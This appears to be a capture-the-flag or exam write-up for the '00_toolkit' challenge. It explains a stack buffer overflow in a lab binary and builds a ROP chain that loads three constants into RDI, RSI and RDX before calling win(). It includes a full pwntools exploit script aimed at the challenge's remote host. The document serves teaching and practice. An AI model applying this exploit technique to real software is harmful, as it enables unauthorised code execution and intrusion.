### Toolkit - ROP w/ Stack BOF

> x Exam (32)


The theoretical principles discussed previously find immediate practical application in the `00_toolkit` challenge. The target application allocates a 64-byte buffer to receive input but erroneously reads up to 256 bytes, establishing a classic stack buffer overflow vulnerability. The primary objective is to redirect execution to a target function named `win` while successfully passing three specific 64-bit constant values: `0x1111111111111111`, `0x2222222222222222`, and `0x3333333333333333`. To facilitate this exercise, the binary has been compiled with explicitly named helper gadgets, specifically `pop_rdi_ret`, `pop_rsi_ret`, `pop_rdx_ret`, and `ret_gadget`.

The exploitation sequence begins by evaluating the binary protections. Executing `checksec` reveals that the non-executable stack mitigation is enabled, precluding the direct execution of injected shellcode, while Position Independent Executable protections are disabled, guaranteeing that all memory addresses remain static and predictable across executions. Subsequent analysis utilizing a 200-byte cyclic pattern in the debugger pinpoints the instruction pointer overwrite offset at exactly 72 bytes. The target function and gadget addresses can then be extracted by filtering the binary's symbol table with the `nm` utility.

Visualizing the final payload layout on the stack is critical for understanding the precise mechanics of the exploit. The structure begins with 72 bytes of padding to consume the local variables and the saved base pointer. The very next 8 bytes must align exactly with the location of the saved instruction pointer, where the address of the `ret_gadget` is placed to ensure proper 16-byte alignment before entering the target function. Following this, the address of the `pop_rdi_ret` gadget is positioned, which immediately precedes the first target constant on the stack. When the processor executes the pop instruction, it advances the stack pointer and loads the underlying constant into the RDI register. This identical sequence is repeated for the RSI and RDX registers, effectively consuming the subsequent stack values and loading the second and third constants respectively. The chain concludes with the absolute address of the `win` function, which the processor executes once the final register is accurately populated.

The fully assembled exploit script leverages the `pwntools` framework to automate this precise memory layout and interact seamlessly with the vulnerable process.



```Python
#!/usr/bin/env python3  
from pwn import *  
  
elf = ELF('./toolkit', checksec=False)  
context.binary = elf  
context.arch = 'amd64'  
  
HOST = "offsec.m0lecon.it"  
PORT = 13573  
  
OFFSET_TO_RIP = 72  
  
a = 0x1111111111111111  
b = 0x2222222222222222  
c = 0x3333333333333333  
  
def conn():  
    if not args.LOCAL:  
        return remote(HOST, PORT)  
    return process(elf.path)  
  
p = conn()  
  
payload = flat(  
    b'A' * OFFSET_TO_RIP,  
    p64(elf.sym.ret_gadget),  
    p64(elf.sym.pop_rdi_ret),  
    p64(a),  
    p64(elf.sym.pop_rsi_ret),  
    p64(b),  
    p64(elf.sym.pop_rdx_ret),  
    p64(c),  
    p64(elf.sym.win)  
)  
  
p.recvuntil(b'Input:')  
p.send(payload)  
p.interactive()
```

Verification of this payload is conducted by attaching the debugger and establishing a breakpoint at the `win` function, ensuring that the RDI, RSI, and RDX registers contain the exact required constants upon entry.




